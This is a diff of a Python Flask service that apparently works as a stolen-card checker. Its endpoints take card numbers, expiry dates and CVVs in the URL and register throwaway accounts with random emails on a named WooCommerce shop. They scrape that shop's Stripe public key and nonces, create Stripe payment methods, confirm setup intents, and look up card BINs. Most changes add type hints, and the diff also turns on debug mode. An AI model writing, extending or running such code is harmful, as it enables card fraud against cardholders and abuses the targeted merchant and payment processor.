@@ -1,9 +1,10 @@
-import os
 from flask import Flask, jsonify, Response
 import requests
 import re
 import json
 import random
+import string
+from typing import Any, Dict, Optional, Tuple
 from datetime import datetime
 
 app = Flask(__name__)
@@ -38,10 +39,10 @@ LAST_NAMES = [
 ]
 
 @app.route('/')
-def home():
+def home() -> str:
     return "API is running. Use /add_payment_method/<details> or /add_payment_method_with_email/<email>/<details>"
 
-def generate_random_email():
+def generate_random_email() -> str:
     """Generate a realistic random email address."""
     
     # Choose random name combination
@@ -64,7 +65,7 @@ def generate_random_email():
     username = random.choice(email_patterns)
     return f"{username}@{domain}".lower()
 
-def extract_stripe_public_key(html_content):
+def extract_stripe_public_key(html_content: str) -> Optional[str]:
     """Extract Stripe public key from HTML content."""
     
     # Pattern 1: Look for Stripe public key in script tags
@@ -119,7 +120,7 @@ def extract_stripe_public_key(html_content):
     
     return None
 
-def get_stripe_public_key(session, headers):
+def get_stripe_public_key(session: requests.Session, headers: Dict[str, str]) -> str:
     """Fetch the website and extract Stripe public key."""
     
     # Try multiple URLs where Stripe key might be present
@@ -144,7 +145,7 @@ def get_stripe_public_key(session, headers):
     
     raise ValueError("Could not extract Stripe public key from any page")
 
-def register_new_user(session, headers, email):
+def register_new_user(session: requests.Session, headers: Dict[str, str], email: str) -> bool:
     """Register a new user with only email (no username/password needed)."""
     
     # Step 1: Get the registration page to extract nonce
@@ -208,16 +209,16 @@ def register_new_user(session, headers, email):
         print(f"Registration error: {e}")
         return False
 
-def validate_email_format(email):
+def validate_email_format(email: str) -> bool:
     """Validate email format."""
     email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-z]{2,}$'
     return bool(re.match(email_pattern, email))
 
-def get_current_time_str():
+def get_current_time_str() -> str:
     """Get current time as formatted string."""
     return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-def calculate_time_taken(start_time_str, end_time_str):
+def calculate_time_taken(start_time_str: str, end_time_str: str) -> str:
     """Calculate time difference between start and end times."""
     try:
         start_time = datetime.strptime(start_time_str, "%Y-%m-%d %H:%M:%S")
@@ -230,7 +231,7 @@ def calculate_time_taken(start_time_str, end_time_str):
     except:
         return "N/A"
 
-def fetch_bin_info(bin_number):
+def fetch_bin_info(bin_number: str) -> Dict[str, Any]:
     """
     Fetch BIN (Bank Identification Number) information from antipublic API.
     
@@ -296,51 +297,8 @@ def fetch_bin_info(bin_number):
             "error": f"Unexpected error: {str(e)}"
         }
 
-def parse_final_response(final_response):
-    """Parse the final AJAX response properly."""
-    try:
-        # Try to parse as JSON first
-        content_type = final_response.headers.get('content-type', '').lower()
-        
-        if 'application/json' in content_type:
-            return final_response.json()
-        else:
-            # Try to parse anyway in case content-type is wrong
-            try:
-                return final_response.json()
-            except:
-                # If not JSON, return text with analysis
-                text = final_response.text
-                status_code = final_response.status_code
-                
-                result = {
-                    "status_code": status_code,
-                    "content_type": content_type,
-                    "raw_response": text[:500] if text else "Empty response",
-                    "response_length": len(text) if text else 0,
-                    "parsed_as": "text"
-                }
-                
-                # Common WordPress AJAX responses analysis
-                if text == "0":
-                    result["analysis"] = "WordPress AJAX returned '0' - usually indicates authentication/permission issue"
-                elif "error" in text.lower():
-                    result["analysis"] = "Response appears to contain error message"
-                elif "success" in text.lower():
-                    result["analysis"] = "Response appears to contain success message"
-                elif len(text) < 100 and text.isdigit():
-                    result["analysis"] = f"Numeric response: {text}"
-                
-                return result
-    except Exception as e:
-        return {
-            "error": f"Failed to parse response: {str(e)}",
-            "status_code": final_response.status_code if hasattr(final_response, 'status_code') else None,
-            "raw_response": str(final_response.text)[:200] if hasattr(final_response, 'text') else str(final_response)[:200]
-        }
-
 @app.route('/add_payment_method/<details>', methods=['GET'])
-def add_payment_method_auto_email(details):
+def add_payment_method_auto_email(details: str) -> Response:
     """Automatically generate email and add payment method with BIN lookup."""
     start_time = get_current_time_str()
     bin_lookup_time = None
@@ -352,7 +310,7 @@ def add_payment_method_auto_email(details):
         print(f"Generated email: {email}")
         
         # Extract card details from URL path
-        parts = details.split('|')
+        parts: list[str] = details.split('|')
         if len(parts) != 4:
             end_time = get_current_time_str()
             return jsonify({
@@ -391,7 +349,7 @@ def add_payment_method_auto_email(details):
         return jsonify(response_data), 500
 
 @app.route('/add_payment_method_with_email/<email>/<details>', methods=['GET'])
-def add_payment_method_with_email(email, details):
+def add_payment_method_with_email(email: str, details: str) -> Response:
     """Add payment method with provided email and include BIN lookup."""
     start_time = get_current_time_str()
     bin_lookup_time = None
@@ -407,7 +365,7 @@ def add_payment_method_with_email(email, details):
             }), 400
         
         # Extract card details from URL path
-        parts = details.split('|')
+        parts: list[str] = details.split('|')
         if len(parts) != 4:
             end_time = get_current_time_str()
             return jsonify({
@@ -445,18 +403,20 @@ def add_payment_method_with_email(email, details):
             response_data['bin_lookup_time'] = bin_lookup_time
         return jsonify(response_data), 500
 
-def _add_payment_method_with_email_and_bin(email, details, start_time, bin_info=None, bin_lookup_time=None):
+def _add_payment_method_with_email_and_bin(email: str, details: str, start_time: str, 
+                                          bin_info: Optional[Dict[str, Any]] = None, 
+                                          bin_lookup_time: Optional[str] = None) -> Response:
     """Internal function to handle adding payment method with email and BIN info."""
     try:
         # Extract card details from URL path
-        parts = details.split('|')
+        parts: list[str] = details.split('|')
         cc, mm, yy, cvv = parts
 
         # Create a session to persist cookies across requests
-        session = requests.Session()
+        session: requests.Session = requests.Session()
 
         # Common headers
-        headers = {
+        headers: Dict[str, str] = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
@@ -501,12 +461,12 @@ def _add_payment_method_with_email_and_bin(email, details, start_time, bin_info=
             return jsonify(response_data), 500
 
         # Step 3: Fetch the add payment method page (now authenticated)
-        page_url = 'https://www.dsegni.com/en/my-account/add-payment-method/'
-        page_response = session.get(page_url, headers=headers)
-        html = page_response.text
+        page_url: str = 'https://www.dsegni.com/en/my-account/add-payment-method/'
+        page_response: requests.Response = session.get(page_url, headers=headers)
+        html: str = page_response.text
 
         # Extract Stripe params (wc_stripe_params or wc_stripe_upe_params)
-        pattern = r"var\s+(wc_stripe_(?:upe_)?params)\s*=\s*(\{.*?\});"
+        pattern: str = r"var\s+(wc_stripe_(?:upe_)?params)\s*=\s*(\{.*?\});"
         match = re.search(pattern, html, re.DOTALL)
         if not match:
             end_time = get_current_time_str()
@@ -520,18 +480,18 @@ def _add_payment_method_with_email_and_bin(email, details, start_time, bin_info=
                 response_data['bin_lookup_time'] = bin_lookup_time
             return jsonify(response_data), 500
         
-        params_str = match.group(2)
+        params_str: str = match.group(2)
 
         # Clean trailing commas in JSON (common in inline scripts)
         params_str = re.sub(r",\s*}", "}", params_str)
         params_str = re.sub(r",\s*]", "]", params_str)
-        wc_params = json.loads(params_str)
+        wc_params: Dict[str, Any] = json.loads(params_str)
 
         # Get the correct nonce for creating setup intent
-        ajax_nonce = wc_params.get('createAndConfirmSetupIntentNonce')
+        ajax_nonce: str | None = wc_params.get('createAndConfirmSetupIntentNonce')
         if not ajax_nonce:
             # Fallback: look for any relevant nonce
-            possible_nonces = [k for k in wc_params.keys() if 'nonce' in k.lower() and ('setup' in k.lower() or 'intent' in k.lower())]
+            possible_nonces: list[str] = [k for k in wc_params.keys() if 'nonce' in k.lower() and ('setup' in k.lower() or 'intent' in k.lower())]
             if possible_nonces:
                 ajax_nonce = wc_params.get(possible_nonces[0])
             else:
@@ -547,7 +507,7 @@ def _add_payment_method_with_email_and_bin(email, details, start_time, bin_info=
                 return jsonify(response_data), 500
 
         # Step 4: Create payment method directly via Stripe API using dynamically extracted key
-        stripe_headers = {
+        stripe_headers: Dict[str, str] = {
             'accept': 'application/json',
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://js.stripe.com',
@@ -556,7 +516,7 @@ def _add_payment_method_with_email_and_bin(email, details, start_time, bin_info=
         }
         
         # Use the dynamically extracted Stripe public key
-        stripe_data = (
+        stripe_data: str = (
             f'type=card'
             f'&card[number]={cc}'
             f'&card[cvc]={cvv}'
@@ -573,12 +533,12 @@ def _add_payment_method_with_email_and_bin(email, details, start_time, bin_info=
             f'&_stripe_version=2024-06-20'
         )
         
-        pm_response = requests.post(
+        pm_response: requests.Response = requests.post(
             'https://api.stripe.com/v1/payment_methods',
             headers=stripe_headers,
             data=stripe_data
         )
-        pm_json = pm_response.json()
+        pm_json: Dict[str, Any] = pm_response.json()
         if 'error' in pm_json:
             end_time = get_current_time_str()
             response_data = {
@@ -591,11 +551,10 @@ def _add_payment_method_with_email_and_bin(email, details, start_time, bin_info=
                 response_data['bin_lookup_time'] = bin_lookup_time
             return jsonify(response_data), 500
         
-        pm_id = pm_json['id']
-        print(f"Created Stripe payment method: {pm_id}")
+        pm_id: str = pm_json['id']
 
         # Step 5: Confirm setup intent via WooCommerce AJAX
-        ajax_headers = {
+        ajax_headers: Dict[str, str] = {
             'accept': '*/*',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
             'origin': 'https://www.dsegni.com',
@@ -603,36 +562,28 @@ def _add_payment_method_with_email_and_bin(email, details, start_time, bin_info=
             'x-requested-with': 'XMLHttpRequest',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
         }
-        ajax_data = {
+        ajax_data: Dict[str, str] = {
             'action': 'wc_stripe_create_and_confirm_setup_intent',
             'wc-stripe-payment-method': pm_id,
             'wc-stripe-payment-type': 'card',
             '_ajax_nonce': ajax_nonce,
         }
-        
-        print(f"Sending AJAX request with nonce: {ajax_nonce[:20]}...")
-        print(f"Payment method ID: {pm_id}")
-        
-        final_response = session.post(
+        final_response: requests.Response = session.post(
             'https://www.dsegni.com/wp-admin/admin-ajax.php',
             headers=ajax_headers,
-            data=ajax_data,
-            timeout=30
+            data=ajax_data
         )
-        
-        # Parse the response properly
-        final_parsed_response = parse_final_response(final_response)
+        final_json: Dict[str, Any] = final_response.json() if final_response.headers.get('content-type', '').startswith('application/json') else {'raw': final_response.text}
         
         end_time = get_current_time_str()
         
         # Prepare response with BIN info if available
         response_data = {
-            'success': True if final_response.status_code == 200 else False,
-            'status_code': final_response.status_code,
+            'success': True,
             'email': email,
             'payment_method_id': pm_id,
             'stripe_key_used': Pk_key[:20] + '...',
-            'final_response': final_parsed_response,
+            'final_response': final_json,
             'Time': calculate_time_taken(start_time, end_time)
         }
         
@@ -651,22 +602,6 @@ def _add_payment_method_with_email_and_bin(email, details, start_time, bin_info=
             'expiry': f"{mm}/{yy}"
         }
         
-        # Determine overall success based on response
-        if final_response.status_code != 200:
-            response_data['overall_success'] = False
-            response_data['error'] = f"HTTP {final_response.status_code} received"
-        elif isinstance(final_parsed_response, dict) and 'error' in final_parsed_response:
-            response_data['overall_success'] = False
-        elif isinstance(final_parsed_response, dict) and 'success' in final_parsed_response:
-            response_data['overall_success'] = final_parsed_response.get('success', False)
-        elif isinstance(final_parsed_response, dict) and 'raw_response' in final_parsed_response:
-            # Check common success patterns in raw text
-            raw_text = final_parsed_response.get('raw_response', '').lower()
-            if 'success' in raw_text or 'payment method added' in raw_text:
-                response_data['overall_success'] = True
-            elif 'error' in raw_text or 'failed' in raw_text or raw_text.strip() == '0':
-                response_data['overall_success'] = False
-        
         return jsonify(response_data)
         
     except Exception as e:
@@ -682,17 +617,17 @@ def _add_payment_method_with_email_and_bin(email, details, start_time, bin_info=
         return jsonify(response_data), 500
 
 @app.route('/register_user', methods=['GET'])
-def register_user_auto():
+def register_user_auto() -> Response:
     """Endpoint to register a random user with email only."""
     start_time = get_current_time_str()
     try:
         email = generate_random_email()
         
         # Create a session
-        session = requests.Session()
+        session: requests.Session = requests.Session()
         
         # Common headers
-        headers = {
+        headers: Dict[str, str] = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
@@ -737,7 +672,7 @@ def register_user_auto():
         }), 500
 
 @app.route('/register_user_with_email/<email>', methods=['GET'])
-def register_user_with_email_route(email):
+def register_user_with_email(email: str) -> Response:
     """Endpoint to register a user with specific email only."""
     start_time = get_current_time_str()
     try:
@@ -749,10 +684,10 @@ def register_user_with_email_route(email):
             }), 400
         
         # Create a session
-        session = requests.Session()
+        session: requests.Session = requests.Session()
         
         # Common headers
-        headers = {
+        headers: Dict[str, str] = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
@@ -784,7 +719,7 @@ def register_user_with_email_route(email):
         }), 500
 
 @app.route('/generate_emails/<int:count>', methods=['GET'])
-def generate_emails(count):
+def generate_emails(count: int) -> Response:
     """Generate multiple random emails."""
     start_time = get_current_time_str()
     try:
@@ -812,7 +747,7 @@ def generate_emails(count):
         }), 500
 
 @app.route('/bin_lookup/<bin_number>', methods=['GET'])
-def bin_lookup(bin_number):
+def bin_lookup(bin_number: str) -> Response:
     """
     Endpoint to fetch BIN information.
     
@@ -843,7 +778,7 @@ def bin_lookup(bin_number):
         }), 500
 
 @app.route('/bin_lookup_from_card/<card_details>', methods=['GET'])
-def bin_lookup_from_card(card_details):
+def bin_lookup_from_card(card_details: str) -> Response:
     """
     Extract BIN from full card details and fetch information.
     
@@ -899,5 +834,4 @@ def bin_lookup_from_card(card_details):
         }), 500
 
 if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 5000))
-    app.run(debug=False, host='0.0.0.0', port=port)
+    app.run(debug=True, host='0.0.0.0', port=5000)
